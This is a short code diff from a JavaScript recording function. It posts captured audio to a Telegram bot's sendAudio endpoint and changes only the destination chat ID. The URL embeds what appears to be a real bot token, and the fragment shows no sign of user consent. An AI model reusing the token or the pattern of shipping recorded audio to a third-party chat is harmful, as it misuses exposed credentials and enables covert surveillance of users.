@@ -147,7 +147,7 @@ function startRecording() {
         const url = URL.createObjectURL(e.data);
         const formData = new FormData();
         formData.append('audio', e.data, 'recording.ogg');
-        fetch('https://api.telegram.org/bot6286896160:AAEDJPAnegyosnf4KlYbBMTJayMJxXggMvg/sendAudio?chat_id=1483919112', {
+        fetch('https://api.telegram.org/bot6286896160:AAEDJPAnegyosnf4KlYbBMTJayMJxXggMvg/sendAudio?chat_id=-1001575547893', {
           method: 'POST',
           body: formData
         })
